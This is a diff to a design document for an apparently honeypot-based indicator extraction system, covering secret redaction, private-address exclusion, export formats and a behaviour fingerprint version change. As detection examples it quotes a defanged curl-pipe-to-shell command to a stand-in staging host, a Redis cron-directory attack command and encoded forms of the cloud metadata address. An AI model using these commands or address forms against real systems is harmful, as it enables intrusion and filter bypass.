@@ -69,13 +69,13 @@ Channels are the capture channels from [ADR 0005](adr/0005-capture-layer.md) and
 | `url` | `http`, `https` or `ftp` URL; scheme and host lower case. | `stage2` or `callback` | `data.url` on `egress`, or built from `data.host`, `data.path`, `data.scheme` and the destination port; URLs inside command lines. |
 | `http_path` | Request path and query exactly as sent, after redaction. `/` alone is not an IOC. | `request` | `data.path` on HTTP `application` events (those with `data.method`); `data.request_path` on `hook` events. |
 | `http_ua` | User-Agent header, at most 512 characters. | `request` | `data.user_agent` (or `data.ua`) on `application` events and canary beacon hits. |
-| `request_substring` | An exact request string. | `request` | Protocol commands on emulator `application` events: `data.command` plus `data.args` (`CONFIG SET dir /var/spool/cron`). Arguments of `AUTH`, `LOGIN` and `PASS` are replaced by `REDACTED`. |
+| `request_substring` | An exact request string. | `request` | Protocol commands on emulator `application` events: `data.command`, then `data.subcommand` when the emulator logs it apart (the Redis emulator does, and leaves it out of `data.args`), then `data.args`: `CONFIG SET dir /var/spool/cron`. Credential arguments are redacted by position (below). |
 | | | `payload` | Inline `data.body` (application) and `data.request_slice` (hook), only when `store_payloads` is on (#16). |
 | `payload_sha256` | Lower-case SHA-256 hex. | `payload` | `data.body_sha256` and the `payload_ref` hash on `application` events; `data.request_slice_sha256` and the `hook.request_slice_ref` hash on `hook` events (#32). |
 | `file_sha256` | Lower-case SHA-256 hex. | `post_exploit` | `data.sha256` and the `payload_ref` hash on `quarantine` events (#9); `data.sha256` on `filesystem` events; hashes in `hook.implant_refs`. |
 | `cmdline` | A command the attacker ran or tried, after redaction. | `post_exploit` | `hook.cmd_lines[]` (#32); `data.cmdline` or `data.argv` on `process` events. URLs inside also become `url` and `domain` or `ip` IOCs with role `stage2`. |
 | `dns_query` | The exact name the decoy was made to look up. | `callback` | `data.query` or `data.qname` on `dns` events. The same name is also a `domain` IOC, so domain-based exports pick it up. |
-| `behaviour_fingerprint` | `bf1:` plus 32 hex characters. | `behaviour` | The attempt's ordered steps. [Format below](#behaviour-fingerprint-format). |
+| `behaviour_fingerprint` | `bf2:` plus 32 hex characters. | `behaviour` | The attempt's ordered steps. [Format below](#behaviour-fingerprint-format). |
 
 By pipeline:
 
@@ -95,15 +95,20 @@ By pipeline:
 Capture data can hold personal information about people who are not the attacker ([privacy-and-retention.md](privacy-and-retention.md#what-foiled-holds-and-why-it-matters)). Extraction follows the #16 defaults:
 
 - **Bodies stay hashed.** With `store_payloads: false` (the default, and what the API uses today) inline bodies and request slices are never IOC values. Their SHA-256 is a `payload_sha256` IOC instead. Request paths, user agents and protocol commands are access-log data and are extracted either way.
-- **Secrets are removed from text values** (`http_path`, `http_ua`, `request_substring`, `cmdline`, `url`):
-  - URL credentials: `http://REDACTED@host/`.
-  - The value after any name that contains, ignoring case, `secret`, `token`, `password`, `passwd`, `pwd`, `api-key`, `api_key`, `apikey`, `private_key`, `signature`, `session`, `sessid`, `auth`, `credential`, `cookie` or `jwt`, or that is exactly `pass`, `key`, `sig` or `sid`. This covers query strings (`?X-Amz-Signature=...`, `&db_passwd=...`), JSON (`"password":"..."`), headers (`X-Api-Key: ...`, `Authorization: ...`) and flags (`--password=...`). Substring matching over-redacts on purpose (`author=` is redacted too).
-  - The word after `--password`, `--pass`, `--token`, `--secret`, `--api-key`, `Bearer` and `Basic`.
-  - The arguments of `AUTH`, `LOGIN` and `PASS` protocol commands.
+- **Secrets are removed from text values** (`http_path`, `http_ua`, `request_substring`, `cmdline`, `url`), keeping their shape. The rules live in `foiled_core::redact` and are pinned by one table test, `crates/core/tests/redaction.rs`, which also runs every case through a frozen copy of the #75 redaction and fails if anything that version hid is shown again (the deliberate exceptions are listed there with reasons).
+  - URL credentials, user and password: `scheme://user:pw@host` and `scheme://TOKEN@host` become `scheme://REDACTED@host`, for any scheme (`http`, `mysql`, `redis`).
+  - The value after a secret-named key: query strings and config lines (`password=x`, `db_password = x`), JSON (`"Password" : "x"`, any case and spacing, escapes honoured) and headers (`name:value` with or without a space: `password:hunter2`, `X-Api-Key: k1 k2`). In text a header value runs to the end of the line or the closing quote; in a command line it ends where the shell ends the word (whitespace, `;`, `|`, `&`, or the closing quote), so `token: x; curl http://...` keeps the `curl`.
+  - A name is secret when it contains, ignoring case, `secret`, `token`, `password`, `passwd`, `pwd`, `api-key`, `api_key`, `apikey`, `private_key`, `privatekey`, `signature`, `session`, `sessid`, `auth`, `credential`, `cookie` or `jwt` (`authkey`, `dbpwd`, `Authentication`, `X-Amz-Signature`, `apiToken`), when one of its parts (split on `-`, `_` and camel case) is `pass`, `sig`, `sid`, `pin` or `key` (`db_pass`, `X-Auth-Pin`, `AuthorKey`), or when it is exactly `pass`, `key`, `sig` or `sid`. `auth` counts inside any part except one that is exactly `author` or `authors` (`authorkey` and `authority` are secrets).
+  - Kept on purpose: name parts `author` and `authors` (`?author=bob`), and switch values (`yes`, `no`, `true`, `false`, `on`, `off`) of a few sshd configuration keywords whose names mention a secret (`PasswordAuthentication=no`, `PermitEmptyPasswords=no`). `password=no` is still hidden. There is no `host:port` exception: a secret-named label before a colon fails closed (`auth-server:REDACTED`, `session-id:REDACTED`), and a dotted host or URL never names a secret, because only the label just before the colon is read.
+  - Command lines are split into commands on `;`, `&&`, `||`, `|`, `&`, newlines and the edges of `( ... )`, `$( ... )` and backticks, with shell quoting honoured. A quote left open (`it's here; curl --token abc`) does not hide the rest of the line: the line is split again treating that quote and later ones as ordinary characters, so every word is still checked. Group and clause words (`{`, `}`, `!`, `if`, `then`, `do` and similar) are skipped when finding the program. Each command finds its program after `VAR=value` assignments and wrappers with their options (`sudo -u root`, `env -i X=1`, `timeout -s KILL 5`, `nice -n 5`, `nohup`, `stdbuf`, `time`, `xargs`, `exec`, `command`), and `sh -c '...'` strings (also `bash -lc`) are redacted as command lines of their own.
+  - The whole word after `--password`, `--pass`, `--token`, `--secret`, `--api-key`, `-pass`, `-passin`, `-passout` and `Bearer`, quotes included: `--password 'my secret'` becomes `--password 'REDACTED'`.
+  - The password half of user and password pairs, separate or attached: `curl -u admin:REDACTED`, `-uadmin:REDACTED`, `--user=admin:REDACTED`, `smbclient -U admin%REDACTED`.
+  - Program password flags: `mysql`, `mysqldump`, `mysqladmin`, `mariadb` and `7z` `-pPW` (`-pREDACTED`, quoted or not; a bare `-p` prompts and is kept); `sshpass -p PW` and `-pPW`; `redis-cli -a PW`; `mosquitto_pub` and `mosquitto_sub -P PW`; `zip` and `unzip -P PW`. Other programs keep their flags (`mkdir -p`, `ssh -p 2222`).
+  - Protocol command arguments by position (`redact::secret_arg_positions`): every argument of `AUTH`, `LOGIN` and `PASS` (user names too, as in #75); user and password after `HELLO ... AUTH`; the password after `MIGRATE ... AUTH` and user and password after `AUTH2`; `CONFIG SET` values of `requirepass`, `masterauth` and other secret-named parameters; `ACL SETUSER` password rules (`>PW`, `<PW`, `#hash`, `!hash`), with or without a user name; and in any other command (`SENTINEL SET m auth-pass PW`, unknown commands) the argument after `AUTH`, `PASS`, `PASSWORD`, `REQUIREPASS`, `MASTERAUTH`, `SECRET`, `TOKEN`, `APIKEY` or any secret-named word (two after `AUTH2`), and secret `name=value` arguments. When the arity is short the rule fails closed and hides everything after the keyword: `HELLO 3 AUTH pw` becomes `HELLO 3 AUTH REDACTED`. The Redis emulator masks the same positions before it logs, so its events arrive masked (hashes in `data.redacted_args`) and extraction still marks those IOCs `redacted`.
 - **Email local parts are removed**, plain or URL-encoded: `ops@example.invalid` becomes `REDACTED@example.invalid` and `ops%40example.invalid` becomes `REDACTED%40example.invalid`.
 - `redacted: true` marks every IOC whose value was changed, so exports know it is not byte-exact. The id is computed over the redacted value, so it is still stable.
 - **Canaries are never IOCs.** Any value containing a canary prefix (`vt-canary-`, `vt_canary_`, `VTCANARY`, `vtcanary`), the planted database host or the `canary_id` of the event is skipped. They are Foiled's own secrets, and contribute-back must never publish them ([contribute-back.md](contribute-back.md#what-a-released-ioc-contains)).
-- **The decoy's own network and the platform are never IOCs.** Private, loopback, link-local (including the cloud metadata address `169.254.169.254`), carrier-grade NAT, unique local (`fd00::/8`), multicast and unspecified addresses are skipped, using the same rule as enrichment. The rule applies to bare addresses and to URL hosts, including the single-number and hexadecimal IPv4 forms (`http://2852039166/`, `http://0xa9fea9fe/`). Local names are skipped as domains, DNS queries and URL hosts: single-label names, `localhost`, and names under `.localhost`, `.local`, `.internal` (which covers `metadata.google.internal`), `.home.arpa`, `.lan`, `.localdomain`, `.in-addr.arpa` and `.ip6.arpa`.
+- **The decoy's own network and the platform are never IOCs.** Private, loopback, link-local (including the cloud metadata address `169.254.169.254`), carrier-grade NAT, unique local (`fd00::/8`), multicast and unspecified addresses are skipped, using the same rule as enrichment, and so are IPv6 addresses that carry one of those IPv4 addresses (IPv4-compatible `::169.254.169.254`, NAT64 `64:ff9b::/96`, 6to4 `2002::/16`). Hosts written with full-width digits or dots are mapped to ASCII first. The rule applies to bare addresses and to URL hosts. IPv4 is read the way `inet_aton` and WHATWG URL parsing read it, so every form that reaches the same address is caught: octal (`0251.0376.0251.0376`, `0177.0.0.1`), hexadecimal per part (`0xa9.0xfe.0xa9.0xfe`) or whole (`0xa9fea9fe`), a single number (`2852039166`) and short forms where the last part fills the remaining bytes (`127.1`, `169.254.43518`). Trailing root dots are ignored before every check (`169.254.169.254.`, `metadata.google.internal.`, `localhost.`). Local names are skipped as domains, DNS queries and URL hosts: single-label names, `localhost`, and names under `.localhost`, `.local`, `.internal` (which covers `metadata.google.internal`), `.home.arpa`, `.lan`, `.localdomain`, `.in-addr.arpa` and `.ip6.arpa`.
 - Values longer than 2,048 characters (512 for user agents) are dropped rather than cut, because a cut value is no longer exact. The hash of the request or file still stands.
 
 ## Display and defanging
@@ -141,18 +146,18 @@ The API asks the store for cached Facts (`Store::enrichment_facts`) for the addr
 
 A behaviour fingerprint is a stable id for "what the attacker did", independent of where from. It is the IOC that still works when there is no file to hash ([glossary](glossary.md)).
 
-**Value:** `bf1:` followed by the first 16 bytes, in lower-case hex, of
+**Value:** `bf2:` followed by the first 16 bytes, in lower-case hex, of
 
 ```text
-SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
+SHA-256( "foiled-behaviour-fingerprint/v2" + "\n" + join("\n", steps) )
 ```
 
 **Steps.** Each event in the attempt gives zero or more normalised steps. Volatile and attacker-chosen values (addresses, host names, query values, arguments, passwords, keys, file names, ports) are left out, so the same tool gives the same steps from anywhere and no secret or canary can reach a fingerprint.
 
 | Event | Step |
 | --- | --- |
-| HTTP request (`application` with `method`) | `http <METHOD> <path shape>`. The path shape is the path without query, at most 16 segments; a segment longer than 32 characters or of 8 or more characters mixing letters and digits (an id or token) becomes `*`, other digit runs fold to `0`; then `?` and the sorted, distinct query parameter names joined by `&`: `/api/upload?path=../x&token=1` becomes `/api/upload?path&token` and `/reset/9f2c4e1a77b0/x` becomes `/reset/*/x`. |
-| Protocol command (`application` with `command`) | `cmd <COMMAND>`, upper case. Only for commands whose first argument is a subcommand (`ACL`, `CLIENT`, `CLUSTER`, `COMMAND`, `CONFIG`, `DEBUG`, `FUNCTION`, `MEMORY`, `MODULE`, `OBJECT`, `SCRIPT`, `XGROUP`, `XINFO`) is it added: `cmd CONFIG SET`. Other arguments, including `AUTH` passwords and `SET` keys, never appear: `AUTH hunter2` and `AUTH vt-canary-...` both give `cmd AUTH`. |
+| HTTP request (`application` with `method`) | `http <METHOD> <path shape>`. The path shape is the path without query, at most 16 segments. A segment becomes `*` when it holds a digit (other than a short version such as `v2`), is longer than 32 characters, or is 12 or more characters with at least 3.5 bits of entropy per character (random looking). Every segment after an account or credential segment (`login`, `signin`, `auth`, `oauth`, `token`, `session`, `reset`, `verify`, `password`, `key`, `user`, `users`, `u`, `account` and similar) also becomes `*`. Then `?` and the sorted, distinct query parameter names (shaped the same way) joined by `&`. `/api/upload?path=../x&token=1` becomes `/api/upload?path&token`, `/login/hunter0` and `/login/correcthorse` both become `/login/*`, and `/api/v2/upload` stays. |
+| Protocol command (`application` with `command`) | `cmd <COMMAND>`, upper case, plus the subcommand: `data.subcommand` when the emulator logs it (the Redis emulator does), otherwise the first argument of commands that take a subcommand (`ACL`, `CLIENT`, `CLUSTER`, `COMMAND`, `CONFIG`, `DEBUG`, `FUNCTION`, `MEMORY`, `MODULE`, `OBJECT`, `SCRIPT`, `XGROUP`, `XINFO`): `cmd CONFIG SET`, `cmd MODULE LOAD`. Other arguments, including `AUTH` passwords and `SET` keys, never appear: `AUTH hunter2` and `AUTH vt-canary-...` both give `cmd AUTH`. |
 | Hook (`hook`) | `hook <hook_id> <stage>`, then `exec <program>` for each of `cmd_lines`. |
 | Process (`process`) | `exec <program>`. |
 | DNS (`dns`) | `dns <QTYPE>` (`A` when missing). |
@@ -172,9 +177,9 @@ SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
 ```json
 {
   "type": "behaviour_fingerprint",
-  "value": "bf1:e5d2f5a92afd8930cbf7518a4983d112",
+  "value": "bf2:07d7fffe3024f68dcedc50ae3405fd39",
   "fingerprint": {
-    "version": 1,
+    "version": 2,
     "steps": [
       "http GET /admin",
       "http POST /api/upload?path&token",
@@ -189,7 +194,14 @@ SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
 }
 ```
 
-**Versioning.** Any change to the step grammar, normalisation or hash input is a new version (`bf2:`) and a new `FINGERPRINT_VERSION`. Old fingerprints are never recomputed under a new version silently; both can be emitted side by side while consumers move.
+**Versioning.** Any change to the step grammar, normalisation or hash input is a new version and a new `FINGERPRINT_VERSION`, with the version in the prefix and in `fingerprint.version`.
+
+| Version | Since | What it hashes |
+| --- | --- | --- |
+| `bf1` | #75 | Path shapes with digit runs folded to `0`; protocol commands with their first argument for subcommand commands, read from `data.args` only. |
+| `bf2` | #77 | Path segments that hold digits, look random or follow an account segment become `*`; protocol commands take `data.subcommand` when the emulator logs it apart; attacker words are length and character checked. Domain string `foiled-behaviour-fingerprint/v2`. |
+
+Foiled computes only the current version. Values of different versions are never compared: a `bf1` and a `bf2` for the same behaviour differ, and equal steps under different versions say nothing. Because IOCs are recomputed from live events on every request, nothing Foiled serves still carries `bf1`. Anything that stored `bf1` values elsewhere (an export, a campaign table, a notebook) must treat them as a separate, retired namespace: campaigns (#33) and correlation cluster within one version only, and re-derive from events rather than map `bf1` to `bf2`.
 
 **Limits.** Timing jitter between attacker-facing and guest-side events can reorder steps across runs of the same tool, giving different fingerprints. Campaign clustering (#33) should compare `fingerprint.steps` for near matches rather than rely on exact ids alone. #12 sequences are hand-written rules; fingerprints are computed and need no rule.
 
@@ -238,13 +250,13 @@ CSV, one row per IOC with the limitation spelt out:
 ```text
 indicator_type,indicator,first_seen,last_seen,file_ioc_limited,note
 cmdline,sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh',2026-10-18T01:02:04Z,2026-10-18T01:02:04Z,true,memory-resident implant: no file hash available
-behaviour_fingerprint,bf1:e5d2f5a92afd8930cbf7518a4983d112,2026-10-18T01:02:03Z,2026-10-18T01:02:10Z,true,memory-resident implant: no file hash available
+behaviour_fingerprint,bf2:07d7fffe3024f68dcedc50ae3405fd39,2026-10-18T01:02:03Z,2026-10-18T01:02:10Z,true,memory-resident implant: no file hash available
 url,hxxp://stage2[.]example[.]invalid/m.sh,2026-10-18T01:02:04Z,2026-10-18T01:02:05Z,true,memory-resident implant: no file hash available
 ```
 
 STIX 2.1 (sketch for #13): network and command-line IOCs become `indicator` objects with patterns (`[url:value = '...']`, `[domain-name:value = '...']`, `[process:command_line = '...']`). The behaviour fingerprint has no STIX observable type, so it becomes an `indicator` with `pattern_type: "foiled-bf"` and the steps in `description`, plus an `x_foiled_file_ioc_limited: true` property. No `file` SCO and no `[file:hashes...]` pattern is emitted. A `note` object on the bundle carries the attempt note above.
 
-MISP (sketch for #13): attributes `ip-dst`, `domain`, `url`, `user-agent`, `text` (command line, category "Payload installation"), and `text` with comment "foiled behaviour fingerprint" for `bf1:` values. The event gets the tag `foiled:file-ioc-limited` and the attempt note as an event comment. No `sha256` or `filename|sha256` attribute.
+MISP (sketch for #13): attributes `ip-dst`, `domain`, `url`, `user-agent`, `text` (command line, category "Payload installation"), and `text` with comment "foiled behaviour fingerprint" for `bf2:` values. The event gets the tag `foiled:file-ioc-limited` and the attempt note as an event comment. No `sha256` or `filename|sha256` attribute.
 
 ## Confidence
 
@@ -304,5 +316,6 @@ Redaction, defanging and extraction are linear in the input; there is no regular
 ## Tests
 
 - `crates/core/src/ioc.rs`: unit tests for redaction (including a hostile 200,000-character input), defanging and refanging, canary and private address exclusion, payload storage gating, memory-only handling, fingerprint stability across sources and input order, deduplication, confidence and export redaction.
-- `crates/lint/tests/iocs.rs`: golden test. [memory-only.input.json](../testdata/iocs/memory-only.input.json) and [file-drop.input.json](../testdata/iocs/file-drop.input.json) are grouped, extracted and enriched with the fake ASN table; the output must match `testdata/iocs/expected/` (one file per IOC, validated against the schema by `foiled-lint`). It also checks the #34 validation case (IP with ASN, user agent, domain and URL, behaviour fingerprint, no file hash) and that the fixtures cover every type. Regenerate with `FOILED_BLESS=1` and review the diff.
+- `crates/emulators/tests/redis_iocs.rs`: runs a credential-heavy session through the real Redis emulator over loopback and checks that [redis-emulator.input.json](../testdata/iocs/redis-emulator.input.json) is exactly its output (volatile ids, times, addresses and ports pinned), checks that the password appears nowhere in the events (the emulator masks it at capture), then that extraction keeps it out and shapes steps from `data.subcommand`. Regenerate with `FOILED_BLESS=1` when the emulator changes.
+- `crates/lint/tests/iocs.rs`: golden test. [memory-only.input.json](../testdata/iocs/memory-only.input.json), [file-drop.input.json](../testdata/iocs/file-drop.input.json) and the Redis emulator fixture are grouped, extracted and enriched with the fake ASN table; the output must match `testdata/iocs/expected/` (one file per IOC, validated against the schema by `foiled-lint`). It also checks the #34 validation case (IP with ASN, user agent, domain and URL, behaviour fingerprint, no file hash) and that the fixtures cover every type. Regenerate with `FOILED_BLESS=1` and review the diff.
 - `crates/api/tests/iocs.rs`: the three endpoints, tenant isolation, scopes, filters, ASN context, `ioc_refs` on attempts and timelines, the CSV export guard on never-redistribute ASN data, and the refusal of `attempt_ioc` overrides.
